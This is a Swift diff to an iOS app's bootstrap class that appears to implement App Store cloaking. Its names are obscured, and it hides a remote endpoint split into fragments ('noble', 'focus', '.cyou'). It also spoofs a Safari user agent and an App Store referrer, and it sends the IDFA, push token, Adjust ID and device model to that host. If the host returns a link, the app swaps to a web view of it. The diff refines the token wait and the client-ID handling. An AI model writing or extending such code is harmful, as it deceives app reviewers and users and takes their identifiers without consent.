@@ -27,7 +27,6 @@ private enum S1 {
 private final class M0: ObservableObject {
     @Published var phase: S0 = .loading
 
-    private let kSeed = "k_s0"
     private let uSeed = ["https://", "noble", "focus", ".cyou", "/app.php"].joined()
     private let userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
     private let referrer = "utm_source=appstore&utm_medium=organic"
@@ -35,6 +34,7 @@ private final class M0: ObservableObject {
     private var isBootstrapping = false
     private var didMakeA0 = false
     private var lastB1: String = ""
+    private var lastSentFCMTokenThisLaunch: String = ""
 
     @MainActor
     func start() {
@@ -59,7 +59,11 @@ private final class M0: ObservableObject {
             .trimmingCharacters(in: .whitespacesAndNewlines)
 
         if trigger == "tokenReceived", didMakeA0 {
-            return
+            let currentToken = (UserDefaults.standard.string(forKey: "k_f0") ?? "")
+                .trimmingCharacters(in: .whitespacesAndNewlines)
+            if currentToken.isEmpty || currentToken == "null" || currentToken == lastSentFCMTokenThisLaunch {
+                return
+            }
         }
         if trigger == "n.c.e1", didMakeA0, pendingPushID.isEmpty {
             print("z s1")
@@ -92,6 +96,7 @@ private final class M0: ObservableObject {
         await requestPushPermissionAndRegister()
         try? await Task.sleep(nanoseconds: 500_000_000)
         await requestATTAndStoreIDFA()
+        let clientUUID = makeClientUUID()
         print("z bootstrap trigger=\(trigger)")
 
         if let cachedTaskLink = normU(UserDefaults.standard.string(forKey: "k_t0")),
@@ -100,7 +105,7 @@ private final class M0: ObservableObject {
         }
 
         if normU(UserDefaults.standard.string(forKey: "k_l0")) == nil {
-            await prepA1()
+            await prepA1(clientUUID: clientUUID)
         }
 
         guard let controlsLinkString = normU(UserDefaults.standard.string(forKey: "k_l0")) else {
@@ -108,11 +113,10 @@ private final class M0: ObservableObject {
             return
         }
 
-        let fcmToken = UserDefaults.standard.string(forKey: "k_f0") ?? "null"
+        let fcmToken = await waitForFCMToken(upToSeconds: 8)
         print("z b0 \(trigger)")
 
-        let storedClientID = (UserDefaults.standard.string(forKey: "k_c0") ?? "")
-            .trimmingCharacters(in: .whitespacesAndNewlines)
+        let storedClientID = normA1(UserDefaults.standard.string(forKey: "k_c0"))
         let pushID = UserDefaults.standard.string(forKey: "k_p0") ?? ""
         let adjustID = await Adjust.adid() ?? ""
         let idfa = UserDefaults.standard.string(forKey: "k_idfa") ?? ""
@@ -124,7 +128,7 @@ private final class M0: ObservableObject {
             URLQueryItem(name: "idfa", value: idfa),
             URLQueryItem(name: "device_model", value: deviceModel)
         ]
-        if isValidUUID(storedClientID) {
+        if let storedClientID {
             queryItems.append(URLQueryItem(name: "client_id", value: storedClientID))
         }
         if !pushID.isEmpty {
@@ -142,8 +146,9 @@ private final class M0: ObservableObject {
         var request = URLRequest(url: controlsURL)
         request.httpMethod = "POST"
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        request.setValue(idA1(), forHTTPHeaderField: "client-uuid")
+        request.setValue(clientUUID, forHTTPHeaderField: "client-uuid")
         request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
+        print("z controls post clientUUID=\(clientUUID)")
         let adjustAttribution = await waitForAdjustAttribution(upToSeconds: 5)
         let requestBody: [String: Any] = [
             "adjust": adjustAttribution,
@@ -160,7 +165,7 @@ private final class M0: ObservableObject {
             }
 
             let decoded = try JSONDecoder().decode(P0.self, from: data)
-            UserDefaults.standard.set(decoded.clientID, forKey: "k_c0")
+            UserDefaults.standard.set(normA1(decoded.clientID) ?? decoded.clientID, forKey: "k_c0")
 
             if let taskLink = normU(decoded.response) {
                 UserDefaults.standard.set(taskLink, forKey: "k_t0")
@@ -171,6 +176,7 @@ private final class M0: ObservableObject {
                     UserDefaults.standard.removeObject(forKey: "k_p0")
                 }
                 await MainActor.run { self.didMakeA0 = true }
+                await MainActor.run { self.lastSentFCMTokenThisLaunch = fcmToken }
                 await MainActor.run { self.phase = .web(taskLink) }
             } else {
                 await MainActor.run { self.phase = .native }
@@ -257,17 +263,22 @@ private final class M0: ObservableObject {
         ]
     }
 
-    private func prepA1() async {
-        var userID = normA1(UserDefaults.standard.string(forKey: "k_u0")) ?? ""
-        if userID.isEmpty {
-            userID = normA1(UserDefaults.standard.string(forKey: "k_w0")) ?? k_s0()
-            if userID.isEmpty {
-                userID = UUID().uuidString
+    private func waitForFCMToken(upToSeconds seconds: Int) async -> String {
+        let attempts = max(seconds * 4, 1)
+        for _ in 0..<attempts {
+            let token = (UserDefaults.standard.string(forKey: "k_f0") ?? "")
+                .trimmingCharacters(in: .whitespacesAndNewlines)
+            if !token.isEmpty, token != "null" {
+                return token
             }
-            UserDefaults.standard.set(userID, forKey: "k_u0")
+            try? await Task.sleep(nanoseconds: 250_000_000)
         }
 
-        guard let serviceLink = await pullA1() else {
+        return UserDefaults.standard.string(forKey: "k_f0") ?? "null"
+    }
+
+    private func prepA1(clientUUID: String) async {
+        guard let serviceLink = await pullA1(clientUUID: clientUUID) else {
             return
         }
 
@@ -276,95 +287,52 @@ private final class M0: ObservableObject {
         }
     }
 
-    private func pullA1() async -> String? {
+    private func pullA1(clientUUID: String) async -> String? {
         let endpoints = [
             uSeed,
             "\(uSeed)?action=check_info"
         ]
 
-        for clientUUID in idsA1() {
-            for endpoint in endpoints {
-                guard let url = URL(string: endpoint) else { continue }
+        for endpoint in endpoints {
+            guard let url = URL(string: endpoint) else { continue }
 
-                var request = URLRequest(url: url)
-                request.httpMethod = "GET"
-                request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
-                request.setValue(clientUUID, forHTTPHeaderField: "client-uuid")
-                request.setValue("application/json", forHTTPHeaderField: "Accept")
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
+            request.setValue(clientUUID, forHTTPHeaderField: "client-uuid")
+            request.setValue("application/json", forHTTPHeaderField: "Accept")
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.httpBody = Data("{}".utf8)
 
-                do {
-                    let (data, response) = try await URLSession.shared.data(for: request)
+            do {
+                let (data, response) = try await URLSession.shared.data(for: request)
 
-                    guard let httpResponse = response as? HTTPURLResponse else { continue }
-                    if let serviceLink = pickU(from: httpResponse, bodyData: data) {
-                        keepA1(clientUUID)
-                        return serviceLink
-                    }
-                } catch {
-                    if isCannotFindHost(error) {
-                        return nil
-                    }
-                    print("z pullA1 endpoint=\(endpoint) error=\(error.localizedDescription)")
+                guard let httpResponse = response as? HTTPURLResponse else { continue }
+                if let serviceLink = pickU(from: httpResponse, bodyData: data) {
+                    return serviceLink
                 }
+            } catch {
+                if isCannotFindHost(error) {
+                    return nil
+                }
+                print("z pullA1 endpoint=\(endpoint) error=\(error.localizedDescription)")
             }
         }
 
         return nil
     }
 
-    private func idsA1() -> [String] {
-        var values: [String] = []
-
-        func appendIfValid(_ raw: String?) {
-            guard let trimmed = normA1(raw) else { return }
-            if !values.contains(trimmed) {
-                values.append(trimmed)
-            }
-        }
-
-        appendIfValid(UserDefaults.standard.string(forKey: "k_u0"))
-        appendIfValid(UserDefaults.standard.string(forKey: "k_w0"))
-        appendIfValid(k_s0())
-
-        return values.isEmpty ? [UUID().uuidString] : values
-    }
-
-    private func idA1() -> String {
-        if let fromWorking = normA1(UserDefaults.standard.string(forKey: "k_w0")) {
-            return fromWorking
-        }
-
-        if let fromUser = normA1(UserDefaults.standard.string(forKey: "k_u0")) {
-            return fromUser
-        }
-
-        return k_s0()
-    }
-
-    private func keepA1(_ value: String) {
-        UserDefaults.standard.set(value, forKey: "k_w0")
-        UserDefaults.standard.set(value, forKey: "k_u0")
-    }
-
-    private func k_s0() -> String {
-        let stored = (UserDefaults.standard.string(forKey: kSeed) ?? "")
-            .trimmingCharacters(in: .whitespacesAndNewlines)
-        if isValidUUID(stored) {
-            return stored
-        }
-
-        let value = UUID().uuidString
-        UserDefaults.standard.set(value, forKey: kSeed)
-        return value
+    private func makeClientUUID() -> String {
+        UUID().uuidString.lowercased()
     }
 
     private func normA1(_ raw: String?) -> String? {
         guard let raw else { return nil }
         let trimmed = raw.trimmingCharacters(in: .whitespacesAndNewlines)
-        guard !trimmed.isEmpty else {
+        guard isValidUUID(trimmed) else {
             return nil
         }
-        return trimmed
+        return trimmed.lowercased()
     }
 
     private func normU(_ raw: String?) -> String? {
